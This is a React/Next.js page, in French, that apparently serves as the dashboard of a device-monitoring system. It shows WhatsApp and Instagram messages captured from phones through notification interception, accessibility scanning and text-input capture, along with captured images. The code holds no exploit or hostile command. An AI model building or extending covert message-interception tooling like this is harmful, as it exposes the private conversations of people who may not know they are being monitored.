'use client';

import { useState, useMemo, useEffect, Suspense } from 'react';
import { useSearchParams } from 'next/navigation';
import { useFirebaseAuth } from '../../../hooks/useFirebaseAuth';
import { useItsYouData } from '../../../hooks/useItsYouData';
import { useMessagesWithFilters, MessageFilters } from '../../../hooks/useMessagesWithFilters';
import { SearchBar } from '../../../components/SearchBar';
import { DateRangeFilter } from '../../../components/DateRangeFilter';
import { MessageSkeleton } from '../../../components/SkeletonLoader';
import { UserSelector } from '../../../components/UserSelector';
import LoadingProgress from '../../../components/LoadingProgress';

interface Message {
  id: string;
  app?: string;
  appName?: string;
  sender?: string;
  recipient?: string;
  content?: string;
  messageText?: string;
  text?: string;
  timestamp?: Date | any;
  deviceId?: string;
  deviceName?: string;
  deviceModel?: string;
  read?: boolean;
  isSent?: boolean;
  messageType?: 'sent' | 'received';
  isGroup?: boolean;
  groupName?: string;
  captureMethod?: 'notification' | 'send_button_click' | 'text_input_cleared' | 'accessibility_filtered' | 'notification_smart' | 'accessibility';
  // Smart grouping fields
  contactName?: string; // Extracted contact name for proper grouping
  threadId?: string; // Conversation thread ID
}

function MessagesContent() {
  const searchParams = useSearchParams();
  const { isAuthenticated } = useFirebaseAuth();

  // Filter states
  const [filter, setFilter] = useState('all');
  const [selectedDevice, setSelectedDevice] = useState('all');
  const [selectedUserId, setSelectedUserId] = useState<string | null>(null);
  const [viewMode, setViewMode] = useState<'list' | 'conversations'>('conversations');
  const [selectedConversation, setSelectedConversation] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState('');
  const [startDate, setStartDate] = useState('');
  const [endDate, setEndDate] = useState('');

  // Build filters object for server-side filtering
  const messageFilters: MessageFilters = useMemo(() => ({
    deviceId: selectedDevice !== 'all' ? selectedDevice : undefined,
    userId: selectedUserId || undefined,
    appType: filter !== 'all' && !['sent', 'received'].includes(filter) ? filter : undefined,
    startDate: startDate ? new Date(startDate) : undefined,
    endDate: endDate ? new Date(endDate) : undefined,
    searchQuery: searchQuery || undefined,
  }), [selectedDevice, selectedUserId, filter, startDate, endDate, searchQuery]);

  // Use new filtered hook with server-side filtering
  const {
    messages: allMessages,
    loading: messagesLoading,
    error: messagesError,
    hasMore,
    loadMore,
    refresh: refreshMessages,
    totalCount,
    loadedCount
  } = useMessagesWithFilters(isAuthenticated, messageFilters, 100);

  // Keep useItsYouData for users and images only (with limited data)
  const { users, capturedImages, loading: metaLoading } = useItsYouData(isAuthenticated);

  const loading = messagesLoading || metaLoading;

  // Read device from URL query parameter and set it
  useEffect(() => {
    const deviceParam = searchParams?.get('device');
    if (deviceParam) {
      setSelectedDevice(deviceParam);
      console.log('Pre-selected device from URL:', deviceParam);
    }
  }, [searchParams]);

  // Helper function for getting message content
  const getMessageContent = (msg: Message) => {
    return msg.content || msg.messageText || msg.text || '(No content)';
  };

  // Calculate devices from messages
  const devices = useMemo(() => {
    const deviceMap = new Map();

    allMessages.forEach((msg: Message) => {
      const deviceId = msg.deviceId || 'unknown';
      if (!deviceMap.has(deviceId)) {
        deviceMap.set(deviceId, {
          id: deviceId,
          deviceName: msg.deviceName || 'Unknown Device',
          model: msg.deviceModel || 'Unknown Model',
          lastActive: msg.timestamp || new Date(),
          totalMessages: 0
        });
      }
      deviceMap.get(deviceId).totalMessages++;

      if (msg.timestamp && msg.timestamp > deviceMap.get(deviceId).lastActive) {
        deviceMap.get(deviceId).lastActive = msg.timestamp;
      }
    });

    return Array.from(deviceMap.values());
  }, [allMessages]);

  // Group messages by conversation
  // NOTE: Filtering is now handled server-side by useMessagesWithFilters
  const conversations = useMemo(() => {
    const convMap = new Map<string, {
      contact: string;
      app: string;
      messages: Message[];
      lastMessage: Date;
      unreadCount: number;
      totalSent: number;
      totalReceived: number;
    }>();

    allMessages.forEach((msg: Message) => {
      // Client-side filter for sent/received type (not in Firestore field)
      if (filter === 'sent' && !(msg.isSent === true || msg.messageType === 'sent')) {
        return;
      }
      if (filter === 'received' && !(msg.isSent === false || msg.messageType === 'received')) {
        return;
      }

      // NEW: Use smart grouping fields if available
      // Priority: contactName > sender/recipient
      const isSent = msg.isSent || msg.messageType === 'sent';

      let contact: string;
      if (msg.contactName) {
        // Use the smart extracted contact name
        contact = msg.contactName;
      } else {
        // Fallback to old logic
        contact = isSent ? (msg.recipient || 'Unknown') : (msg.sender || 'Unknown');
      }

      // Skip "Me" as contact or truly unknown contacts
      if (contact === 'Me' || contact === 'Unknown') return;

      const app = msg.appName || msg.app || 'Unknown';

      // Use threadId for better grouping if available
      const key = msg.threadId || `${contact}-${app}`;

      if (!convMap.has(key)) {
        convMap.set(key, {
          contact,
          app,
          messages: [],
          lastMessage: msg.timestamp || new Date(),
          unreadCount: 0,
          totalSent: 0,
          totalReceived: 0
        });
      }

      const conv = convMap.get(key)!;
      conv.messages.push(msg);

      if (msg.timestamp && msg.timestamp > conv.lastMessage) {
        conv.lastMessage = msg.timestamp;
      }

      if (isSent) {
        conv.totalSent++;
      } else {
        conv.totalReceived++;
        if (!msg.read) conv.unreadCount++;
      }
    });

    // Sort conversations by last message time
    return Array.from(convMap.entries())
      .map(([key, conv]) => ({
        key,
        ...conv,
        messages: conv.messages.sort((a, b) => {
          const timeA = a.timestamp?.getTime?.() || 0;
          const timeB = b.timestamp?.getTime?.() || 0;
          return timeA - timeB; // Oldest first for conversation view
        })
      }))
      .sort((a, b) => {
        const timeA = a.lastMessage?.getTime?.() || 0;
        const timeB = b.lastMessage?.getTime?.() || 0;
        return timeB - timeA; // Newest conversations first
      });
  }, [allMessages, filter]);

  // Filter messages for list view
  // NOTE: Most filtering is now server-side, only client-side filter for sent/received type
  const messages = useMemo(() => {
    let filtered = [...allMessages];

    // Client-side filter for sent/received type only (these don't have dedicated Firestore fields)
    if (filter === 'sent') {
      filtered = filtered.filter((msg: Message) => msg.isSent === true || msg.messageType === 'sent');
    } else if (filter === 'received') {
      filtered = filtered.filter((msg: Message) => msg.isSent === false || msg.messageType === 'received');
    }

    // Sort by timestamp (newest first)
    filtered.sort((a, b) => {
      const timeA = a.timestamp?.getTime?.() || 0;
      const timeB = b.timestamp?.getTime?.() || 0;
      return timeB - timeA;
    });

    return filtered;
  }, [allMessages, filter]);

  const getDeviceName = (deviceId?: string) => {
    if (!deviceId) return 'Unknown Device';
    return devices.find(d => d.id === deviceId)?.deviceName || deviceId;
  };

  function formatTimestamp(timestamp: Date | any): string {
    if (!timestamp) return 'Unknown time';

    try {
      let date: Date;

      if (timestamp instanceof Date) {
        date = timestamp;
      } else if (timestamp && typeof timestamp === 'object' && 'toDate' in timestamp) {
        // Firestore Timestamp
        date = timestamp.toDate();
      } else if (typeof timestamp === 'number') {
        date = new Date(timestamp);
      } else if (typeof timestamp === 'string') {
        date = new Date(timestamp);
      } else {
        return 'Invalid date';
      }

      if (isNaN(date.getTime())) {
        return 'Invalid date';
      }

      return date.toLocaleString('fr-FR', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
      });
    } catch (error) {
      console.error('Error formatting timestamp:', error);
      return 'Invalid date';
    }
  }

  function formatTimeShort(timestamp: Date | any): string {
    if (!timestamp) return '';

    try {
      let date: Date;

      if (timestamp instanceof Date) {
        date = timestamp;
      } else if (timestamp && typeof timestamp === 'object' && 'toDate' in timestamp) {
        // Firestore Timestamp
        date = timestamp.toDate();
      } else if (typeof timestamp === 'number') {
        date = new Date(timestamp);
      } else if (typeof timestamp === 'string') {
        date = new Date(timestamp);
      } else {
        return '';
      }

      if (isNaN(date.getTime())) {
        return '';
      }

      const now = new Date();
      const diffMs = now.getTime() - date.getTime();
      const diffMins = Math.floor(diffMs / 60000);
      const diffHours = Math.floor(diffMins / 60);
      const diffDays = Math.floor(diffHours / 24);

      if (diffMins < 1) return 'À l\'instant';
      if (diffMins < 60) return `Il y a ${diffMins}min`;
      if (diffHours < 24) return `Il y a ${diffHours}h`;
      if (diffDays < 7) return `Il y a ${diffDays}j`;
      return date.toLocaleDateString('fr-FR');
    } catch (error) {
      console.error('Error formatting time short:', error);
      return '';
    }
  }

  const getCaptureMethodIcon = (method?: string) => {
    switch (method) {
      case 'send_button_click': return '🎯';
      case 'text_input_cleared': return '⌨️';
      case 'accessibility_filtered': return '👁️';
      case 'notification': return '🔔';
      case 'notification_smart': return '🧠'; // Smart AI filtering
      default: return '❓';
    }
  };

  const getCaptureMethodLabel = (method?: string) => {
    switch (method) {
      case 'send_button_click': return 'Send Button';
      case 'text_input_cleared': return 'Text Input';
      case 'accessibility_filtered': return 'Visual Scan';
      case 'notification': return 'Notification';
      case 'notification_smart': return 'Smart Filter'; // NEW
      default: return 'Unknown';
    }
  };

  const getCaptureMethodStyle = (method?: string) => {
    switch (method) {
      case 'send_button_click': return 'bg-purple-500/20 text-purple-400 border border-purple-500/30';
      case 'text_input_cleared': return 'bg-orange-500/20 text-orange-400 border border-orange-500/30';
      case 'accessibility_filtered': return 'bg-cyan-500/20 text-cyan-400 border border-cyan-500/30';
      case 'notification': return 'bg-yellow-500/20 text-yellow-400 border border-yellow-500/30';
      case 'notification_smart': return 'bg-green-500/20 text-green-400 border border-green-500/30'; // NEW: Green for smart
      default: return 'bg-gray-500/20 text-gray-400 border border-gray-500/30';
    }
  };

  const selectedConv = conversations.find(c => c.key === selectedConversation);

  // Calculate smart filtering stats
  const smartFilteredCount = allMessages.filter(m => m.captureMethod === 'notification_smart').length;
  const oldNotificationCount = allMessages.filter(m => m.captureMethod === 'notification').length;
  const totalMessages = allMessages.length;

  return (
    <div className="space-y-6">
      {/* Header with Live Loading Counter */}
      <div className="flex items-center justify-between">
        <div>
          <div className="flex items-center space-x-3">
            <h2 className="text-3xl font-bold text-white mb-2">Messages</h2>
            {messagesLoading && loadedCount > 0 && (
              <div className="flex items-center space-x-2 animate-pulse">
                <span className="text-blue-400 text-sm">⏳</span>
                <span className="text-blue-400 font-semibold text-sm">
                  Chargement... {loadedCount} {totalCount > 0 && `/ ${totalCount}`}
                </span>
              </div>
            )}
            {!messagesLoading && loadedCount > 0 && (
              <div className="glass-input px-3 py-1 rounded-full">
                <span className="text-green-400 font-semibold text-sm">
                  ✓ {loadedCount} {totalCount > 0 && `/ ${totalCount}`} chargés
                </span>
              </div>
            )}
          </div>
          <p className="text-gray-400">Conversations WhatsApp et Instagram</p>
        </div>
        <div className="flex space-x-3">
          <button
            onClick={() => setViewMode(viewMode === 'list' ? 'conversations' : 'list')}
            className="glass-input px-6 py-3 rounded-lg text-white font-semibold hover:glass-button transition-all"
          >
            {viewMode === 'list' ? '💬 Vue Conversations' : '📋 Vue Liste'}
          </button>
          <button
            onClick={refreshMessages}
            disabled={messagesLoading}
            className="glass-input px-6 py-3 rounded-lg text-white font-semibold hover:glass-button transition-all disabled:opacity-50"
            title="Actualiser"
          >
            🔄
          </button>
        </div>
      </div>

      {/* Error Display */}
      {messagesError && (
        <div className="glass-card p-4 border-2 border-red-500/30 bg-red-500/10">
          <div className="flex items-center space-x-3">
            <div className="bg-red-500/20 text-red-400 w-12 h-12 rounded-full flex items-center justify-center text-2xl">
              ⚠️
            </div>
            <div className="flex-1">
              <h3 className="text-white font-semibold">Erreur de chargement</h3>
              <p className="text-sm text-red-300">{messagesError}</p>
            </div>
            <button
              onClick={refreshMessages}
              className="glass-button px-4 py-2 rounded-lg text-white font-semibold hover:scale-105 transition-all"
            >
              🔄 Réessayer
            </button>
          </div>
        </div>
      )}

      {/* Smart Filtering Stats */}
      {smartFilteredCount > 0 && (
        <div className="glass-card p-4 border-2 border-green-500/30">
          <div className="flex items-center space-x-3">
            <div className="bg-green-500/20 text-green-400 w-12 h-12 rounded-full flex items-center justify-center text-2xl">
              🧠
            </div>
            <div className="flex-1">
              <h3 className="text-white font-semibold">Smart AI Filtering Active</h3>
              <p className="text-sm text-gray-400">
                {smartFilteredCount} messages intelligently filtered • {conversations.length} conversations properly grouped
                {oldNotificationCount > 0 && (
                  <span className="text-yellow-400"> • {oldNotificationCount} old notifications (will be replaced)</span>
                )}
              </p>
            </div>
            <div className="bg-green-500/10 px-4 py-2 rounded-lg">
              <div className="text-green-400 font-bold text-lg">{((smartFilteredCount / totalMessages) * 100).toFixed(0)}%</div>
              <div className="text-xs text-gray-400">Smart Filtered</div>
            </div>
          </div>
        </div>
      )}

      {/* User Filter */}
      {users.length > 0 && (
        <UserSelector
          users={users}
          selectedUserId={selectedUserId}
          onSelectUser={setSelectedUserId}
        />
      )}

      {/* Device Filter */}
      {devices.length > 0 && (
        <div className="glass-card p-4">
          <div className="flex items-center space-x-4 overflow-x-auto">
            <span className="text-sm text-gray-400 whitespace-nowrap">Device:</span>
            <button
              onClick={() => setSelectedDevice('all')}
              className={`px-4 py-2 rounded-lg text-sm font-medium transition-all whitespace-nowrap ${
                selectedDevice === 'all'
                  ? 'glass-button text-white'
                  : 'glass-input text-gray-400 hover:text-white'
              }`}
            >
              Tous ({allMessages.length})
            </button>
            {devices.map((device) => (
              <button
                key={device.id}
                onClick={() => setSelectedDevice(device.id)}
                className={`px-4 py-2 rounded-lg text-sm font-medium transition-all whitespace-nowrap ${
                  selectedDevice === device.id
                    ? 'glass-button text-white'
                    : 'glass-input text-gray-400 hover:text-white'
                }`}
              >
                {device.deviceName} ({device.totalMessages})
              </button>
            ))}
          </div>
        </div>
      )}

      {/* Search and Filters */}
      <div className="glass-card p-6 space-y-4">
        <SearchBar
          value={searchQuery}
          onChange={setSearchQuery}
          placeholder="Rechercher par contenu, expéditeur, ou destinataire..."
        />

        <div className="flex flex-wrap items-center gap-4">
          <div className="flex items-center space-x-4 overflow-x-auto">
            <span className="text-sm text-gray-400 whitespace-nowrap">Filtre:</span>
            {['all', 'whatsapp', 'instagram', 'sent', 'received'].map((f) => (
              <button
                key={f}
                onClick={() => setFilter(f)}
                className={`px-4 py-2 rounded-lg text-sm font-medium transition-all whitespace-nowrap ${
                  filter === f
                    ? 'glass-button text-white'
                    : 'glass-input text-gray-400 hover:text-white'
                }`}
              >
                {f === 'all' && '🌐 Tous'}
                {f === 'whatsapp' && '📱 WhatsApp'}
                {f === 'instagram' && '📷 Instagram'}
                {f === 'sent' && '📤 Envoyés'}
                {f === 'received' && '📥 Reçus'}
              </button>
            ))}
          </div>

          <DateRangeFilter
            startDate={startDate}
            endDate={endDate}
            onStartDateChange={setStartDate}
            onEndDateChange={setEndDate}
            onClear={() => {
              setStartDate('');
              setEndDate('');
            }}
          />
        </div>
      </div>

      {/* Loading Progress */}
      {messagesLoading && (
        <div className="glass-card p-6">
          <div className="flex items-center justify-between mb-4">
            <h3 className="text-white font-semibold">Loading Messages...</h3>
            <span className="text-gray-400 text-sm">
              {loadedCount} / {totalCount} messages
            </span>
          </div>
          <LoadingProgress
            loaded={loadedCount}
            total={totalCount}
            itemName="messages"
            showPercentage={true}
          />
        </div>
      )}

      {loading ? (
        <div className="space-y-3">
          {Array.from({ length: 5 }).map((_, i) => (
            <MessageSkeleton key={i} />
          ))}
        </div>
      ) : viewMode === 'conversations' ? (
        /* Conversations View */
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Conversations List */}
          <div className="lg:col-span-1 glass-card p-4">
            <h3 className="text-lg font-bold text-white mb-4">
              Conversations ({conversations.length})
              {messagesLoading && (
                <span className="text-blue-400 text-sm ml-2 animate-pulse">⏳</span>
              )}
            </h3>
            <div className="space-y-2 max-h-[600px] overflow-y-auto">
              {conversations.length === 0 && !messagesLoading ? (
                <div className="text-center py-8">
                  <p className="text-gray-400">Aucune conversation</p>
                </div>
              ) : conversations.length === 0 && messagesLoading ? (
                <div className="text-center py-8">
                  <div className="text-4xl mb-2 animate-pulse">⏳</div>
                  <p className="text-blue-400 text-sm">Chargement...</p>
                </div>
              ) : (
                conversations.map((conv) => (
                  <button
                    key={conv.key}
                    onClick={() => setSelectedConversation(conv.key)}
                    className={`w-full text-left p-4 rounded-lg transition-all ${
                      selectedConversation === conv.key
                        ? 'glass-button'
                        : 'glass-input hover:glass-card'
                    }`}
                  >
                    <div className="flex items-start space-x-3">
                      <div className={`w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0 ${
                        conv.app.toLowerCase().includes('whatsapp')
                          ? 'bg-green-500/20 text-green-400'
                          : 'bg-pink-500/20 text-pink-400'
                      }`}>
                        {conv.app.toLowerCase().includes('whatsapp') ? '📱' : '📷'}
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center justify-between mb-1">
                          <h4 className="text-white font-semibold truncate">{conv.contact}</h4>
                          {conv.unreadCount > 0 && (
                            <span className="bg-blue-500 text-white text-xs px-2 py-1 rounded-full">
                              {conv.unreadCount}
                            </span>
                          )}
                        </div>
                        <p className="text-gray-400 text-xs truncate">
                          {getMessageContent(conv.messages[conv.messages.length - 1])}
                        </p>
                        <div className="flex items-center justify-between mt-2">
                          <span className="text-xs text-gray-500">
                            {formatTimeShort(conv.lastMessage)}
                          </span>
                          <div className="flex items-center space-x-2 text-xs">
                            <span className="text-green-400">📤 {conv.totalSent}</span>
                            <span className="text-blue-400">📥 {conv.totalReceived}</span>
                          </div>
                        </div>
                      </div>
                    </div>
                  </button>
                ))
              )}
            </div>
          </div>

          {/* Conversation Detail */}
          <div className="lg:col-span-2 glass-card p-6">
            {selectedConv ? (
              <>
                <div className="flex items-center justify-between mb-6 pb-4 border-b border-white/10">
                  <div className="flex items-center space-x-4">
                    <div className={`w-12 h-12 rounded-full flex items-center justify-center ${
                      selectedConv.app.toLowerCase().includes('whatsapp')
                        ? 'bg-green-500/20 text-green-400'
                        : 'bg-pink-500/20 text-pink-400'
                    }`}>
                      {selectedConv.app.toLowerCase().includes('whatsapp') ? '📱' : '📷'}
                    </div>
                    <div>
                      <h3 className="text-xl font-bold text-white">{selectedConv.contact}</h3>
                      <p className="text-sm text-gray-400">{selectedConv.app} • {selectedConv.messages.length} messages</p>
                    </div>
                  </div>
                  <button
                    onClick={() => setSelectedConversation(null)}
                    className="text-gray-400 hover:text-white transition-colors"
                  >
                    ✕
                  </button>
                </div>

                <div className="space-y-4 max-h-[500px] overflow-y-auto">
                  {selectedConv.messages.map((msg, idx) => {
                    const isSent = msg.isSent || msg.messageType === 'sent';

                    // Find images associated with this message (by timestamp proximity)
                    const msgTime = msg.timestamp?.getTime?.() || 0;
                    const associatedImages = capturedImages.filter(img => {
                      const imgTime = img.timestamp?.getTime?.() || 0;
                      const timeDiff = Math.abs(imgTime - msgTime);
                      // Consider images within 5 minutes of the message
                      return timeDiff < 300000 &&
                             img.appName === selectedConv.app &&
                             img.messageType === (isSent ? 'sent' : 'received');
                    });

                    return (
                      <div key={msg.id || idx}>
                        <div
                          className={`flex ${isSent ? 'justify-end' : 'justify-start'}`}
                        >
                          <div className={`max-w-[70%] ${
                            isSent
                              ? 'bg-green-500/20 border border-green-500/30'
                              : 'bg-blue-500/20 border border-blue-500/30'
                          } rounded-lg p-3`}>
                            <div className="flex items-center flex-wrap gap-2 mb-1">
                              <span className="text-xs font-semibold">{isSent ? '📤 Envoyé' : '📥 Reçu'}</span>
                              <span className="text-xs text-gray-400">{formatTimeShort(msg.timestamp)}</span>
                              {msg.captureMethod && (
                                <span className={`text-xs px-2 py-0.5 rounded-full ${getCaptureMethodStyle(msg.captureMethod)}`}>
                                  {getCaptureMethodIcon(msg.captureMethod)} {getCaptureMethodLabel(msg.captureMethod)}
                                </span>
                              )}
                            </div>
                            <p className="text-white break-words">{getMessageContent(msg)}</p>

                            {/* Display associated images */}
                            {associatedImages.length > 0 && (
                              <div className="mt-3 grid grid-cols-2 gap-2">
                                {associatedImages.map((img) => (
                                  <a
                                    key={img.id}
                                    href={img.url}
                                    target="_blank"
                                    rel="noopener noreferrer"
                                    className="relative group"
                                  >
                                    <img
                                      src={img.url}
                                      alt={img.originalFilename}
                                      className="w-full h-32 object-cover rounded-lg border border-white/20 hover:border-white/50 transition-all"
                                    />
                                    <div className="absolute inset-0 bg-black/50 opacity-0 group-hover:opacity-100 transition-opacity rounded-lg flex items-center justify-center">
                                      <span className="text-white text-sm">🔍 Ouvrir</span>
                                    </div>
                                  </a>
                                ))}
                              </div>
                            )}

                            <p className="text-xs text-gray-500 mt-1">
                              {formatTimestamp(msg.timestamp)}
                            </p>
                          </div>
                        </div>
                      </div>
                    );
                  })}
                </div>
              </>
            ) : (
              <div className="flex items-center justify-center h-full text-center py-20">
                <div>
                  <div className="text-6xl mb-4">💬</div>
                  <p className="text-gray-400 text-lg">Sélectionnez une conversation</p>
                  <p className="text-gray-500 text-sm mt-2">Cliquez sur une conversation pour voir les détails</p>
                </div>
              </div>
            )}
          </div>
        </div>
      ) : (
        /* List View */
        <div className="glass-card p-6">
          <h3 className="text-xl font-bold text-white mb-6">
            Messages ({messages.length} trouvés)
          </h3>

          {messages.length === 0 && !messagesLoading ? (
            <div className="text-center py-12">
              <div className="text-6xl mb-4">📭</div>
              <p className="text-gray-400 text-lg">Aucun message trouvé</p>
              <p className="text-gray-500 text-sm mt-2">
                {searchQuery || startDate || endDate
                  ? 'Essayez de modifier vos filtres de recherche'
                  : 'Les messages apparaîtront ici une fois capturés'}
              </p>
            </div>
          ) : messages.length === 0 && messagesLoading ? (
            <div className="text-center py-12">
              <div className="text-6xl mb-4 animate-pulse">⏳</div>
              <p className="text-blue-400 text-lg font-semibold">Chargement des messages...</p>
              <p className="text-gray-500 text-sm mt-2">
                Veuillez patienter pendant que nous récupérons vos messages
              </p>
            </div>
          ) : (
            <>
              <div className="space-y-3">
                {messages.map((msg: Message) => {
                const isSent = msg.isSent || msg.messageType === 'sent';
                const contact = isSent ? msg.recipient : msg.sender;

                return (
                  <div key={msg.id} className="glass-input p-4 rounded-lg hover:glass-card transition-all">
                    <div className="flex items-start space-x-4">
                      {/* App Icon */}
                      <div className={`w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0 ${
                        (msg.app || msg.appName || '').toLowerCase().includes('whatsapp')
                          ? 'bg-green-500/20 text-green-400'
                          : 'bg-pink-500/20 text-pink-400'
                      }`}>
                        {(msg.app || msg.appName || '').toLowerCase().includes('whatsapp') ? '📱' : '📷'}
                      </div>

                      {/* Message Content */}
                      <div className="flex-1">
                        <div className="flex items-center space-x-3 mb-2">
                          <span className={`text-xs px-2 py-1 rounded-full font-semibold ${
                            isSent
                              ? 'bg-green-500/20 text-green-400'
                              : 'bg-blue-500/20 text-blue-400'
                          }`}>
                            {isSent ? '📤 Envoyé' : '📥 Reçu'}
                          </span>
                          <h4 className="text-white font-semibold">{contact || 'Unknown'}</h4>
                          <span className="text-xs text-gray-500">
                            {msg.appName || msg.app || 'Unknown'}
                          </span>
                        </div>
                        <p className="text-gray-300">{getMessageContent(msg)}</p>
                        <div className="flex items-center flex-wrap gap-2 mt-2">
                          <span className="text-xs text-gray-500">{formatTimestamp(msg.timestamp)}</span>
                          <span className="text-xs px-2 py-1 rounded-full bg-gray-500/20 text-gray-400">
                            {getDeviceName(msg.deviceId)}
                          </span>
                          {msg.captureMethod && (
                            <span className={`text-xs px-2 py-1 rounded-full ${getCaptureMethodStyle(msg.captureMethod)}`}>
                              {getCaptureMethodIcon(msg.captureMethod)} {getCaptureMethodLabel(msg.captureMethod)}
                            </span>
                          )}
                        </div>
                      </div>
                    </div>
                  </div>
                );
              })}
              </div>

              {/* Load More Button */}
              {hasMore && (
                <div className="mt-6 text-center">
                  <button
                    onClick={loadMore}
                    disabled={messagesLoading}
                    className="glass-button px-8 py-3 rounded-lg text-white font-semibold disabled:opacity-50 disabled:cursor-not-allowed hover:scale-105 transition-all"
                  >
                    {messagesLoading ? (
                      <span className="flex items-center space-x-2">
                        <span className="animate-spin">⏳</span>
                        <span>Chargement...</span>
                      </span>
                    ) : (
                      <span>📥 Charger Plus ({messages.length}/{totalCount})</span>
                    )}
                  </button>
                </div>
              )}

              {/* Show message if all loaded */}
              {!hasMore && messages.length > 0 && (
                <div className="mt-6 text-center">
                  <p className="text-gray-400 text-sm">
                    ✓ Tous les messages ont été chargés ({messages.length}/{totalCount})
                  </p>
                </div>
              )}
            </>
          )}
        </div>
      )}
    </div>
  );
}

export default function MessagesPage() {
  return (
    <Suspense fallback={
      <div className="space-y-3">
        {Array.from({ length: 5 }).map((_, i) => (
          <MessageSkeleton key={i} />
        ))}
      </div>
    }>
      <MessagesContent />
    </Suspense>
  );
}
